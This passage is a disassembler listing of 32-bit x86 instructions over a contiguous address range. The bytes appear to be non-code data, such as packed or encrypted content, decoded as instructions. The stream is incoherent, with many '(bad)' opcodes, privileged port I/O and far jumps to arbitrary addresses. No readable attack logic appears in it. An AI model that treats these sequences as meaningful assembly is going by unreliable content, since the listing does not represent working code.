  419665:	xlat   BYTE PTR ds:[ebx]
  419666:	dec    ebp
  419667:	dec    ecx
  419668:	mov    BYTE PTR [edi],ch
  41966a:	inc    ecx
  41966b:	(bad)  
  41966c:	cmp    eax,0xeb8deb7d
  419671:	and    al,0xc
  419673:	and    eax,0x3695521d
  419678:	ins    BYTE PTR es:[edi],dx
  419679:	jmp    0x419669
  41967b:	xchg   ebp,eax
  41967c:	mov    esp,0x907d3df5
  419681:	fnsave [edx-0x40]
  419684:	fdivr  DWORD PTR [esi+0x60fa392f]
  41968a:	out    0x8c,eax
  41968c:	rcr    DWORD PTR [ebx+0x6fccb78],cl
  419692:	push   ss
  419693:	push   0x4c
  419695:	loope  0x419694
  419697:	or     eax,DWORD PTR [eax+0x4b]
  41969a:	mov    ds:0x4186d258,al
  41969f:	outs   dx,BYTE PTR ds:[esi]
  4196a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a1:	adc    al,0xe0
  4196a3:	jmp    0x173d:0x258e45de
  4196aa:	jg     0x419672
  4196ac:	pop    esp
  4196ad:	or     eax,0xefe77f6
  4196b2:	mov    DWORD PTR [edi+0x3d3c1c11],eax
  4196b8:	fadd   DWORD PTR ds:[ecx]
  4196bb:	and    al,0x44
  4196bd:	(bad)  
  4196be:	rcl    DWORD PTR [ebx-0x6f],1
  4196c1:	adc    ch,ah
  4196c3:	ret    
  4196c4:	(bad)  
  4196c6:	(bad)  
  4196c7:	mov    ecx,0x72887f5d
  4196cc:	daa    
  4196cd:	xchg   esp,eax
  4196ce:	mov    DWORD PTR [bp+0x40],ebp
  4196d2:	inc    esi
  4196d3:	push   ds
  4196d4:	mov    esp,DWORD PTR [esi-0x65]
  4196d7:	mov    ah,0x8
  4196d9:	into   
  4196da:	ins    DWORD PTR es:[edi],dx
  4196db:	jl     0x419752
  4196dd:	jecxz  0x41972e
  4196df:	dec    ecx
  4196e0:	push   ecx
  4196e1:	sti    
  4196e2:	adc    dh,BYTE PTR [ebx]
  4196e4:	inc    esp
  4196e5:	sti    
  4196e6:	xchg   esi,eax
  4196e7:	addr16 ret 0x6c80
  4196eb:	and    ecx,DWORD PTR [esi-0x6b27c588]
  4196f1:	sbb    DWORD PTR [edx],edx
  4196f3:	xchg   edx,eax
  4196f4:	and    eax,0x1a5a72d0
  4196f9:	int    0xa
  4196fb:	out    dx,al
  4196fc:	in     eax,0xd0
  4196fe:	push   0x4c
  419700:	loope  0x419773
  419702:	ret    0x357c
  419705:	(bad)  
  419706:	hlt    
  419707:	mov    ds:0xf70b19f,al
  41970c:	out    dx,al
  41970d:	sar    DWORD PTR [ebx-0x809df63],1
  419713:	push   0xc
  419715:	fwait
  419716:	hlt    
  419717:	ins    DWORD PTR es:[edi],dx
  419718:	call   0x8aa0:0x768d361
  41971f:	push   es
  419720:	jns    0x419710
  419722:	pop    ebx
  419723:	push   edi
  419724:	outs   dx,BYTE PTR ds:[esi]
  419725:	jp     0x419705
  419727:	mov    eax,ds:0x50c9a61
  41972c:	aam    0xdd
  41972e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41972f:	xor    BYTE PTR [ecx],ah
  419731:	adc    al,0x31
  419733:	xor    al,0x46
  419735:	mov    ch,0x67
  419737:	jo     0x4196d8
  419739:	xchg   ebx,eax
  41973a:	pusha  
  41973b:	cmp    BYTE PTR [ebp+ebp*2+0x1bc62328],dh
  419742:	mov    eax,ds:0x198a67bd
  419747:	out    0x6,al
  419749:	inc    edx
  41974a:	mov    ?,WORD PTR [edi+esi*8+0x17f27a88]
  419751:	neg    BYTE PTR [esi]
  419753:	mov    ecx,0x7b9335a
  419758:	dec    ebp
  419759:	fcomp  QWORD PTR [esi+0x33]
  41975c:	scas   al,BYTE PTR es:[edi]
  41975d:	pop    esi
  41975e:	xlat   BYTE PTR fs:[ebx]
  419760:	mov    ebp,0x16e27ae4
  419765:	sub    eax,0x11a8528c
  41976a:	or     esp,DWORD PTR [ebp+ecx*4+0x38cf77f9]
  419771:	mov    bh,0xc5
  419773:	es lahf 
  419775:	dec    edi
  419776:	retf   0xcc48
  419779:	jo     0x41974c
  41977b:	pop    ds
  41977c:	pop    edi
  41977d:	cmp    al,0x3b
  41977f:	or     eax,0x8869343c
  419784:	inc    eax
  419785:	jecxz  0x41971f
  419787:	xchg   esi,eax
  419788:	pop    edx
  419789:	(bad)
  41978c:	mov    dl,0x9c
  41978e:	mov    ah,BYTE PTR [edi-0x27b6afd8]
  419794:	lea    esi,[ebp-0x3f]
  419797:	sub    ah,BYTE PTR [edx]
  419799:	int3   
  41979a:	cs jg  0x41980a
  41979d:	int3   
  41979e:	pusha  
  41979f:	into   
  4197a0:	jge    0x419811
  4197a2:	pop    ss
  4197a3:	xchg   ebx,eax
  4197a4:	mov    esp,0xac039f74
  4197a9:	mov    esp,0x313f498f
  4197ae:	mov    ah,0x3d
  4197b0:	(bad)  
  4197b1:	pop    ss
  4197b2:	out    dx,al
  4197b3:	push   esp
  4197b4:	lahf   
  4197b5:	addr16 mov ebp,0xbc6f7ea8
  4197bb:	push   0xc3185d1f
  4197c0:	jns    0x4197ed
  4197c2:	jbe    0x4197d7
  4197c4:	int    0x1d
  4197c6:	jns    0x4197ea
  4197c8:	stos   DWORD PTR es:[edi],eax
  4197c9:	mov    ch,0xe5
  4197cb:	and    BYTE PTR [edx-0x3307af20],al
  4197d1:	inc    esp
  4197d2:	jmp    0x419785
  4197d4:	jge    0x419815
  4197d6:	fdivr  DWORD PTR [esi+ecx*4+0x48]
  4197da:	sub    BYTE PTR [ebx-0x2b],cl
  4197dd:	out    dx,eax
  4197de:	fsubr  st(0),st
  4197e0:	xlat   BYTE PTR ds:[ebx]
  4197e1:	shl    al,cl
  4197e3:	hlt    
  4197e4:	add    eax,0xfb38f341
  4197e9:	pop    esi
  4197ea:	addr16 xchg ebx,eax
  4197ec:	xchg   ecx,eax
  4197ed:	and    DWORD PTR [ebx+0x2f],ecx
  4197f0:	jp     0x419855
  4197f2:	dec    edi
  4197f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f5:	mov    eax,ds:0xbc438b66
  4197fa:	pusha  
  4197fb:	ins    DWORD PTR es:[edi],dx
  4197fc:	adc    esp,DWORD PTR [edi-0x9]
  4197ff:	clc    
  419800:	fs (bad) 
  419802:	xor    al,0x40
  419805:	cmp    cl,bh
  419807:	clc    
  419808:	cmp    BYTE PTR [eax-0x3b],al
  41980b:	jns    0x41987e
  41980d:	rol    DWORD PTR [ebp+eiz*2+0x2282d08c],0x3a
  419815:	adc    al,0x7b
  419817:	(bad)  [ebx+ebx*1]
  41981a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41981b:	fidiv  DWORD PTR [ebp+0x69]
  41981e:	cwde   
  41981f:	and    eax,0x6ea1526c
  419824:	addr16 hlt 
  419826:	inc    ebp
  419827:	popf   
  419828:	int3   
  419829:	stos   BYTE PTR es:[edi],al
  41982a:	xor    DWORD PTR [esi+0x7f],edx
  41982d:	or     dh,dh
  41982f:	idiv   DWORD PTR [edi-0x4]
  419832:	push   ss
  419833:	push   0xeb6dd572
  419838:	in     eax,dx
  419839:	(bad)  
  41983a:	add    ah,BYTE PTR [ebp+0x7d1bd1c4]
  419840:	repnz dec esi
  419842:	sub    BYTE PTR [ebp+ebp*8-0x2f],dh
  419846:	adc    eax,0x50f22f53
  41984b:	mov    esi,0x2d569bf5
  419850:	clc    
  419851:	std    
  419852:	xor    dl,al
  419854:	test   al,0x1d
  419856:	xchg   edx,eax
  419857:	cld    
  419858:	jmp    0x1e3d371c
  41985d:	push   esi
  41985e:	mov    WORD PTR [esi-0x191b7ab3],?
  419864:	push   ecx
  419865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419866:	cli    
  419867:	fimul  DWORD PTR [eax]
  419869:	repz pop eax
  41986b:	sub    al,0xba
  41986d:	shl    edx,cl
  41986f:	fild   WORD PTR [esi]
  419871:	jmp    0x20a84259
  419876:	sub    cl,BYTE PTR [eax-0x32]
  419879:	cmc    
  41987a:	mov    edi,0x77d563e0
  41987f:	push   ds
  419880:	cmp    ah,BYTE PTR [ebp-0x751d1022]
  419886:	push   es
  419887:	or     al,0x7c
  419889:	loopne 0x419890
  41988b:	fist   DWORD PTR [edx-0x493ceff6]
  419891:	out    dx,eax
  419892:	sub    edi,DWORD PTR [edx+0x4e967d59]
  419898:	outs   dx,DWORD PTR ds:[esi]
  419899:	jmp    0x41989b
  41989b:	gs pop ecx
  41989d:	dec    edx
  41989e:	out    0xe1,al
  4198a0:	mov    DWORD PTR [edi],eax
  4198a2:	sub    DWORD PTR [ecx+esi*4-0x7a474237],edx
  4198a9:	pop    ebp
  4198aa:	sub    BYTE PTR [ebp-0x403418a],bh
  4198b0:	inc    edx
  4198b1:	mov    ebp,0xb92b2f12
  4198b6:	jnp    0x419847
  4198b8:	mov    ds:0x318debf7,al
  4198bd:	fbld   TBYTE PTR [ecx-0x211de41e]
  4198c3:	daa    
  4198c4:	loop   0x41985b
  4198c6:	mov    eax,0xf19ca686
  4198cb:	cdq    
  4198cc:	cmp    eax,0x79e7cdd6
  4198d1:	dec    ebp
  4198d2:	inc    esp
  4198d3:	xor    eax,0x1956feb3
  4198d8:	add    al,BYTE PTR [edx+0x5522d854]
  4198de:	in     eax,0x1c
  4198e0:	xchg   esp,eax
  4198e1:	jb     0x41988d
  4198e3:	imul   edi,DWORD PTR [edx+edx*2-0x1],0xffffffd9
  4198e8:	popa   
  4198e9:	inc    esp
  4198ea:	jmp    0xa9bb:0x49a3173f
  4198f1:	jmp    0x526b335
  4198f6:	dec    eax
  4198f7:	bound  esi,QWORD PTR [ebx-0x18]
  4198fa:	sub    DWORD PTR [esp+ebx*8+0x681eae89],edi
  419901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419902:	cmp    bl,dh
  419904:	dec    ebp
  419905:	je     0x419935
  419907:	std    
  419908:	mov    DWORD PTR [ebp-0x31b0e045],0xacd7a06
  419912:	add    ebx,DWORD PTR [edi-0x26]
  419915:	rcl    ah,1
  419917:	push   ecx
  419918:	mov    bh,0xf3
  41991a:	push   esp
  41991b:	outs   dx,DWORD PTR ds:[esi]
  41991c:	push   cs
  41991d:	push   esp
  41991e:	dec    esi
  41991f:	add    al,0x95
  419921:	mov    ss,WORD PTR [ebx+edi*2+0x5d]
  419925:	es dec esi
  419927:	sbb    esi,DWORD PTR [ebp+0x3c294932]
  41992d:	loope  0x419917
  41992f:	sub    dl,dl
  419931:	jle    0x41992e
  419933:	mov    edi,0xe184f8f3
  419938:	int    0x3b
  41993a:	sub    ebp,DWORD PTR [esi+0x2c]
  41993d:	mov    eax,0x79c8eeff
  419942:	in     al,dx
  419943:	adc    BYTE PTR [edi+0x74616395],dh
  419949:	int3   
  41994a:	xor    eax,0x5aafa44b
  41994f:	inc    edi
  419950:	mov    esp,DWORD PTR [ebp-0x78]
  419953:	mov    ebp,0x58ee4f16
  419958:	xchg   ah,dl
  41995a:	adc    edi,DWORD PTR [ebx+0x4b]
  41995d:	mov    esp,0xe91645e5
  419962:	jle    0x41993c
  419964:	(bad)  
  419965:	pop    ds
  419966:	mov    eax,0x78c89123
  41996b:	pop    eax
  41996c:	sti    
  41996d:	(bad)  
  41996e:	or     DWORD PTR [edi],edi
  419970:	mov    cl,0x4
  419972:	jne    0x4199cf
  419974:	add    DWORD PTR [eax],ebp
  419976:	fimul  WORD PTR [edi-0x7c89f629]
  41997c:	mov    dl,dh
  41997e:	mov    ebx,0xb71955ad
  419983:	and    DWORD PTR [ecx+0x55],0x32e1977b
  41998a:	sub    eax,0xf712149
  41998f:	fisubr DWORD PTR [ebx-0x2e]
  419992:	in     eax,0xa1
  419994:	inc    esp
  419995:	mov    BYTE PTR [esi+0x65],ah
  419998:	sub    al,ch
  41999a:	ror    DWORD PTR [ecx+0x6c],cl
  41999d:	test   al,0x70
  41999f:	pop    DWORD PTR ds:0xaaf41346
  4199a5:	daa    
  4199a6:	lea    eax,[eax]
  4199a8:	adc    al,BYTE PTR [ebx]
  4199aa:	test   DWORD PTR ds:0xb667342d,edi
  4199b0:	mov    ebp,0x129347a1
  4199b5:	fld    DWORD PTR [eax]
  4199b7:	mov    ds:0xc2965f89,eax
  4199bc:	pop    edi
  4199bd:	icebp  
  4199be:	cmp    DWORD PTR [eax+0x49cd9495],0x2
  4199c5:	in     al,dx
  4199c6:	retf   0x533a
  4199c9:	and    DWORD PTR [ebx],edx
  4199cb:	add    ecx,ebp
  4199cd:	aad    0x9a
  4199cf:	xor    edx,DWORD PTR [esp+esi*2]
  4199d2:	pop    ds
  4199d3:	dec    ebx
  4199d4:	mov    ecx,0xe03ab7ef
  4199d9:	nop
  4199da:	scas   al,BYTE PTR es:[edi]
  4199db:	pop    ds
  4199dc:	xchg   ebp,eax
  4199dd:	push   ebx
  4199de:	shr    DWORD PTR [esi+0x48f4ff00],cl
  4199e4:	xor    ah,BYTE PTR [ecx-0x7ed0826c]
  4199ea:	sbb    ebp,DWORD PTR ds:0x3906402
  4199f0:	jbe    0x419a6f
  4199f2:	jg     0x419997
  4199f4:	xchg   ebx,eax
  4199f5:	mov    ds:0xc828001e,eax
  4199fa:	inc    esi
  4199fb:	lds    esp,FWORD PTR [bp+di]
  4199fe:	xor    DWORD PTR [edx],0xd70cd226
  419a04:	pusha  
  419a05:	xchg   esp,esi
  419a07:	lods   al,BYTE PTR ds:[esi]
  419a08:	pop    esi
  419a09:	cmp    cl,ah
  419a0b:	mov    edx,0x5c554050
  419a10:	mov    edi,0x1deca95
  419a15:	sahf   
  419a16:	mov    eax,0x37f5c06c
  419a1b:	mov    ebx,0xea74ca23
  419a20:	push   ss
  419a21:	aad    0xa1
  419a23:	(bad)  
  419a24:	stc    
  419a25:	or     ch,bl
  419a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a28:	jecxz  0x419a31
  419a2a:	stos   DWORD PTR es:[edi],eax
  419a2b:	int    0xdf
  419a2d:	(bad)  
  419a2f:	sub    cl,al
  419a31:	repnz in al,dx
  419a33:	daa    
  419a34:	jmp    0x70a7609d
  419a39:	out    0xb5,al
  419a3b:	jl     0x419a56
  419a3d:	mov    dh,0x3e
  419a3f:	add    BYTE PTR [esp+edx*4+0x13],cl
  419a43:	cmp    al,0x7d
  419a45:	push   esp
  419a46:	push   ecx
  419a47:	clc    
  419a48:	jns    0x419a08
  419a4a:	push   ebx
  419a4b:	pop    edx
  419a4c:	inc    eax
  419a4d:	sub    esp,DWORD PTR [ebp-0x5e]
  419a50:	ror    dl,1
  419a52:	cs cli 
  419a54:	mov    dl,0x3c
  419a56:	lock jmp 0xa5cb:0x3e3a1c75
  419a5e:	cmp    al,0x4e
  419a60:	lahf   
  419a61:	push   ss
  419a62:	out    0xf5,al
  419a64:	jnp    0x419a0a
  419a66:	neg    BYTE PTR [edx+ebp*4-0x51]
  419a6a:	mov    ah,BYTE PTR [edi-0x1e]
  419a6d:	fsubr  st,st(5)
  419a6f:	pop    eax
  419a70:	inc    esi
  419a71:	fwait
  419a72:	and    BYTE PTR [ebp+0x6c],cl
  419a75:	mov    BYTE PTR [eax],bl
  419a77:	pop    esp
  419a78:	add    DWORD PTR [esi-0x5c],ecx
  419a7b:	cdq    
  419a7c:	shl    DWORD PTR [ecx-0x6e],cl
  419a7f:	mov    esi,0x9e90798c
  419a84:	(bad)  
  419a85:	fidivr DWORD PTR [ebx-0x46cf07f4]
  419a8b:	in     eax,0xff
  419a8d:	scas   eax,DWORD PTR es:[edi]
  419a8e:	gs mov ecx,0xcfd06031
  419a94:	sti    
  419a95:	mov    edi,0x16f83ba6
  419a9a:	es test eax,0x93ce621e
  419aa0:	push   ebp
  419aa1:	cmp    ebp,edi
  419aa3:	sub    eax,0x31548260
  419aa8:	imul   ebp,esi,0xffffff94
  419aab:	stc    
  419aac:	push   ds
  419aad:	cli    
  419aae:	div    DWORD PTR [eax]
  419ab0:	es leave 
  419ab2:	sub    eax,0x56f57be
  419ab7:	out    dx,eax
  419ab8:	in     eax,dx
  419ab9:	lock adc ebx,DWORD PTR [edx]
  419abc:	sbb    BYTE PTR [edi+0x66],dl
  419abf:	push   edx
  419ac0:	dec    edi
  419ac1:	test   eax,0x63230b44
  419ac6:	xchg   ebx,eax
  419ac7:	rcr    DWORD PTR [edi],cl
  419ac9:	or     esi,DWORD PTR [ebx]
  419acb:	inc    ecx
  419acc:	ja     0x419ad9
  419ace:	xor    ch,cl
  419ad0:	lods   al,BYTE PTR ds:[esi]
  419ad1:	inc    esp
  419ad2:	cwde   
  419ad3:	jmp    0x419b4a
  419ad5:	pop    esp
  419ad6:	loopne 0x419a58
  419ad8:	xor    DWORD PTR [ebx-0x6b],ebx
  419adb:	(bad)  
  419add:	fmul   st(4),st
  419adf:	mul    dl
  419ae1:	sbb    edi,DWORD PTR [edx+0x6a]
  419ae4:	jg     0x419b44
  419ae6:	out    0xce,al
  419ae8:	adc    bl,BYTE PTR [ecx+0x1cd0f5da]
  419aee:	mov    ds:0x79b6ebac,al
  419af3:	iret   
  419af4:	mov    ebx,0x381c7d52
  419af9:	sub    ebx,DWORD PTR [ecx-0x57e0357a]
  419aff:	pop    es
  419b00:	cdq    
  419b01:	xchg   ebp,eax
  419b02:	mov    esp,0x34dac2a7
  419b07:	(bad)  
  419b09:	leave  
  419b0a:	repz je 0x419b21
  419b0d:	hlt    
  419b0e:	cld    
  419b0f:	sbb    al,0x61
  419b11:	add    bh,bl
  419b13:	imul   esi,DWORD PTR [ebp+0x50],0x23143188
  419b1a:	mov    ah,0x41
  419b1c:	mov    dh,0x50
  419b1e:	in     al,0x70
  419b20:	pop    esi
  419b21:	push   ecx
  419b22:	push   ecx
  419b23:	(bad)  
  419b25:	sbb    al,0xd1
  419b27:	pusha  
  419b28:	ins    BYTE PTR es:[edi],dx
  419b29:	dec    ebx
  419b2a:	mov    BYTE PTR [ecx-0x6669249d],bl
  419b30:	jecxz  0x419ae6
  419b32:	adc    edx,DWORD PTR [ebx-0x2b]
  419b35:	sub    eax,0xaf890953
  419b3a:	outs   dx,BYTE PTR ds:[esi]
  419b3b:	add    dl,BYTE PTR [ebx]
  419b3d:	ret    
  419b3e:	or     DWORD PTR [ecx-0x5c5516f5],0xffffffb5
  419b45:	push   ds
  419b46:	mov    bh,0x77
  419b48:	add    DWORD PTR [ebp+eiz*8-0xad3077e],edx
  419b4f:	and    bl,BYTE PTR fs:[eax-0x7d]
  419b53:	xor    ebx,DWORD PTR [esi+0x7ea1cda]
  419b59:	jne    0x419af8
  419b5b:	mov    dh,0xb6
  419b5d:	test   BYTE PTR es:[esi+0x5368f888],cl
  419b64:	iret   
  419b65:	scas   al,BYTE PTR es:[edi]
  419b66:	nop
  419b67:	inc    ebp
  419b68:	and    DWORD PTR [ebp+0x70122967],eax
  419b6e:	jno    0x419b55
  419b70:	xchg   edx,eax
  419b71:	jge    0x419bb1
  419b73:	je     0x419afb
  419b75:	stos   BYTE PTR es:[edi],al
  419b76:	adc    esp,DWORD PTR [ebp+eiz*2+0x6b30d7c0]
  419b7d:	add    dl,ch
  419b7f:	mov    eax,ds:0x7395a3cf
  419b84:	inc    ecx
  419b85:	idiv   BYTE PTR [esi-0x5230c0a3]
  419b8b:	mov    eax,0x33b39d70
  419b90:	push   cs
  419b91:	xchg   esp,eax
  419b92:	(bad)  
  419b94:	add    al,0x94
  419b96:	and    esi,edx
  419b98:	test   eax,0x2d38f5d3
  419b9d:	sti    
  419b9e:	xor    bh,ah
  419ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ba1:	xor    DWORD PTR [eax+0x1d],esp
  419ba4:	push   cs
  419ba5:	loope  0x419c17
  419ba7:	jl     0x419b75
  419ba9:	dec    esp
  419baa:	shl    bl,cl
  419bac:	jne    0x419bee
  419bae:	mov    bh,0x9e
  419bb0:	nop
  419bb1:	(bad)  
  419bb2:	leave  
  419bb3:	aad    0x78
  419bb5:	loop   0x419b7f
  419bb7:	and    DWORD PTR [ebx+0x7b],esi
  419bba:	mov    dl,dl
  419bbc:	push   edx
  419bbd:	rcr    bh,cl
  419bbf:	jns    0x419b64
  419bc1:	outs   dx,DWORD PTR ds:[esi]
  419bc2:	lahf   
  419bc3:	test   al,0xcb
  419bc5:	mov    esi,0x49195ab9
  419bca:	adc    BYTE PTR [ebp-0x5ba852ed],dh
  419bd0:	into   
  419bd1:	push   0x4a51b5f7
  419bd6:	jl     0x419c1f
  419bd8:	sbb    BYTE PTR [edx-0x4e],0xd3
  419bdc:	lds    esp,FWORD PTR [ebx+edi*2-0x1ed21c57]
  419be3:	imul   esi,edx,0x93d9ebc5
  419be9:	shr    BYTE PTR [edx+0x9621391],1
  419bef:	and    DWORD PTR [ecx-0xb],eax
  419bf2:	addr16 test al,0x9b
  419bf5:	pop    es
  419bf6:	push   0xe8460575
  419bfb:	sub    cl,BYTE PTR [eax-0xe]
  419bfe:	dec    esi
  419bff:	rol    BYTE PTR [ebx+edx*4-0x32],0x2
  419c04:	mov    edi,0x6cabfc6b
  419c09:	sub    DWORD PTR [eax-0x7],edx
  419c0c:	cdq    
  419c0d:	jl     0x419b9c
  419c0f:	ins    DWORD PTR es:[edi],dx
  419c10:	pop    ebx
  419c11:	jmp    FWORD PTR [eax+0x6a]
  419c14:	pusha  
  419c15:	cmp    dl,BYTE PTR [edx-0x3fe57ebc]
  419c1b:	and    al,bh
  419c1d:	sbb    al,0x45
  419c1f:	dec    eax
  419c20:	stos   BYTE PTR es:[edi],al
  419c21:	push   ss
  419c22:	or     esi,ebx
  419c24:	cmc    
  419c25:	mov    ecx,0x5913b112
  419c2a:	xchg   DWORD PTR [edi+eiz*2+0x7c1f1aa8],esp
  419c31:	adc    al,ah
  419c33:	fld    TBYTE PTR [eax]
  419c35:	xchg   edx,eax
  419c36:	add    ebx,DWORD PTR [ebp-0xaa997e5]
  419c3c:	je     0x419ca2
  419c3e:	pushf  
  419c3f:	gs sbb edx,ebx
  419c42:	and    dh,ch
  419c44:	and    ebx,0x8b9f6468
  419c4a:	lahf   
  419c4b:	pop    edx
  419c4c:	pop    ebp
  419c4d:	es cmc 
  419c4f:	lock rcr BYTE PTR [esi+0x4e77a9d],cl
  419c56:	stc    
  419c57:	hlt    
  419c58:	xchg   esp,eax
  419c59:	fisubr WORD PTR [ebx]
  419c5b:	add    al,0xeb
  419c5d:	fcom   DWORD PTR [esp+esi*8-0x4]
  419c61:	cmc    
  419c62:	ds ds in eax,0xb4
  419c66:	pop    es
  419c67:	or     eax,0xaf716dbf
  419c6c:	jnp    0x419cdd
  419c6e:	cmp    eax,0x96ca60c6
  419c73:	cmp    BYTE PTR [edi-0x7b5e2d41],ah
  419c79:	bound  esi,QWORD PTR [eax+0x7c6d50fd]
  419c7f:	pushf  
  419c80:	das    
  419c81:	push   0xc1f5b576
  419c86:	xor    BYTE PTR [edi],ah
  419c88:	mov    al,0x53
  419c8a:	sbb    edi,ebp
  419c8c:	mov    cl,0xe5
  419c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c8f:	icebp  
  419c90:	stos   DWORD PTR es:[di],eax
  419c92:	pop    eax
  419c93:	in     eax,0xf3
  419c95:	pop    ebp
  419c96:	jmp    0x70c7:0x59d54b92
  419c9d:	pop    ebx
  419c9e:	cmp    al,0x38
  419ca0:	jns    0x419c48
  419ca2:	in     eax,0x92
  419ca4:	lahf   
  419ca5:	xor    DWORD PTR [eax+0x2f],esp
  419ca8:	cdq    
  419ca9:	enter  0x700d,0x9d
  419cad:	sub    dh,BYTE PTR [edx]
  419caf:	sbb    eax,0x4de7f849
  419cb4:	pop    esi
  419cb5:	(bad)  [ecx+esi*1]
  419cb8:	cli    
  419cb9:	outs   dx,BYTE PTR ds:[esi]
  419cba:	dec    esp
  419cbb:	mov    bh,0x40
  419cbd:	lock les edi,FWORD PTR [edx+0xe]
  419cc1:	shl    bh,1
  419cc3:	loope  0x419d2d
  419cc5:	push   edx
  419cc6:	dec    edi
  419cc7:	jmp    0xcd145746
  419ccc:	mov    eax,0x753d0edd
  419cd1:	and    cl,al
  419cd3:	es add eax,0xb78a7160
  419cd9:	pop    esi
  419cda:	aas    
  419cdb:	pop    es
  419cdc:	pop    ecx
  419cdd:	scas   eax,DWORD PTR es:[edi]
  419cde:	sub    al,0x74
  419ce0:	ficomp WORD PTR [ebp-0xb]
  419ce3:	out    dx,eax
  419ce4:	loop   0x419c88
  419ce6:	shl    edi,cl
  419ce8:	and    edi,edx
  419cea:	sbb    BYTE PTR [esi],al
  419cec:	cmp    BYTE PTR [ecx-0x41],al
  419cef:	cmp    eax,0xc15b992
  419cf4:	mov    ah,BYTE PTR [edi-0x6e]
  419cf7:	push   edi
  419cf8:	hlt    
  419cf9:	out    0x20,al
  419cfb:	mov    al,0x50
  419cfd:	or     BYTE PTR [ebp+ebp*8+0x42],ch
  419d01:	popa   
  419d02:	sbb    al,0x47
  419d04:	test   al,0x14
  419d06:	jmp    0x419d08
  419d08:	xchg   esi,eax
  419d09:	out    0x96,eax
  419d0b:	sbb    BYTE PTR [esi+0x48],bh
  419d0e:	outs   dx,BYTE PTR ds:[esi]
  419d0f:	jne    0x419cd8
  419d11:	rcr    ch,0x1e
  419d14:	cmp    ah,BYTE PTR [esi+0x7e]
  419d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d18:	jmp    0x419d05
  419d1a:	jmp    0x914d:0xfc6c4525
  419d21:	enter  0x68d9,0xf4
  419d25:	sub    al,0x6f
  419d27:	mov    DWORD PTR [ecx+0x59],ecx
  419d2a:	pop    ebx
  419d2b:	das    
  419d2c:	shr    BYTE PTR [ecx+0x3fac7f42],0xe4
  419d33:	mov    al,ds:0x2eac00de
  419d38:	imul   ecx,DWORD PTR [esi+ebp*4],0xc587e08e
  419d3f:	in     al,dx
  419d40:	aas    
  419d41:	aaa    
  419d42:	jmpw   0x188a
  419d46:	loopne 0x419d3e
  419d48:	(bad)  
  419d49:	xchg   ecx,eax
  419d4a:	and    BYTE PTR ds:0x58f66618,bh
  419d50:	loopne 0x419d12
  419d52:	leave  
  419d53:	dec    esi
  419d54:	xor    al,0xcb
  419d56:	push   ecx
  419d57:	loope  0x419d37
  419d59:	cmc    
  419d5a:	or     BYTE PTR [eax],dh
  419d5c:	push   ss
  419d5d:	fsqrt  
  419d5f:	add    BYTE PTR [edi],ah
  419d61:	add    ah,ah
  419d63:	fwait
  419d64:	out    0x2f,al
  419d66:	xor    al,dl
  419d68:	mov    es,esi
  419d6a:	push   esp
  419d6b:	cmp    bl,BYTE PTR [ebx+0x2c623fe0]
  419d71:	jl     0x419d49
  419d73:	push   ds
  419d74:	push   ds
  419d75:	pop    edx
  419d76:	fld    QWORD PTR [eax]
  419d78:	into   
  419d79:	inc    edx
  419d7a:	fs xor eax,0x2345caa3
  419d80:	add    BYTE PTR [ecx],0xa1
  419d83:	push   cs
  419d84:	xor    cl,BYTE PTR ds:0x86a24caa
  419d8a:	xchg   esi,eax
  419d8b:	out    0x9e,eax
  419d8d:	add    ecx,DWORD PTR es:[edx]
  419d90:	inc    ecx
  419d91:	inc    esp
  419d92:	scas   ax,WORD PTR es:[edi]
  419d94:	call   0xbfcc:0xc510eb19
  419d9b:	imul   BYTE PTR [ebx]
  419d9d:	xchg   BYTE PTR [ebx-0x36],ah
  419da0:	ror    BYTE PTR [esi+ebp*1-0x18],1
  419da4:	add    DWORD PTR [edx+esi*2-0x12],ebx
  419da8:	push   ss
  419da9:	push   esi
  419daa:	or     eax,DWORD PTR ds:0x60c860b3
  419db0:	cmp    al,0x52
  419db2:	iret   
  419db3:	je     0x419d86
  419db5:	mov    eax,0xa2141269
  419dba:	inc    eax
  419dbb:	mov    ebx,0xc4c274d7
  419dc0:	jecxz  0x419d99
  419dc2:	add    ah,BYTE PTR [ebp-0x2f3e7462]
  419dc8:	test   BYTE PTR [eax],al
  419dca:	cmp    al,0xd7
  419dcc:	fild   DWORD PTR [ebx+eiz*2]
  419dcf:	adc    bh,BYTE PTR [esi+ecx*2]
  419dd2:	push   esp
  419dd3:	sub    DWORD PTR es:[ebx+0x5e7e3143],esp
  419dda:	and    bl,0x5d
  419ddd:	in     eax,dx
  419dde:	mov    ah,0x61
  419de0:	loope  0x419e11
  419de2:	mov    edx,0x4f7ae0df
  419de7:	pop    es
  419de8:	out    dx,al
  419de9:	or     esi,edx
  419deb:	fist   WORD PTR ds:0xc519da11
  419df1:	mov    cl,0x7
  419df3:	fimul  DWORD PTR [eax-0x76d775e9]
  419df9:	pop    ss
  419dfa:	inc    edi
  419dfb:	das    
  419dfc:	push   esp
  419dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dfe:	in     eax,0x85
  419e00:	fisttp WORD PTR [edi-0x51]
  419e03:	pop    eax
  419e04:	loopne 0x419d99
  419e06:	outs   dx,DWORD PTR ds:[esi]
  419e07:	jecxz  0x419e7a
  419e09:	mov    al,ds:0x53f7882
  419e0e:	clc    
  419e0f:	sub    ah,cl
  419e11:	in     eax,0x33
  419e13:	jae    0x419e44
  419e15:	or     eax,0xf1976c69
  419e1a:	mov    BYTE PTR [eax],bl
  419e1c:	je     0x419dec
  419e1e:	ja     0x419e78
  419e20:	sub    ah,bl
  419e22:	add    BYTE PTR [ebp-0x37],0x2c
  419e26:	lods   eax,DWORD PTR ds:[esi]
  419e27:	adc    dl,ch
  419e29:	inc    esi
  419e2a:	cmp    al,0x62
  419e2c:	xchg   ecx,eax
  419e2d:	push   0x488abe03
  419e32:	mov    dl,0x5d
  419e34:	jae    0x419dc6
  419e36:	out    dx,al
  419e37:	push   0x5e
  419e39:	in     al,0x81
  419e3b:	in     eax,dx
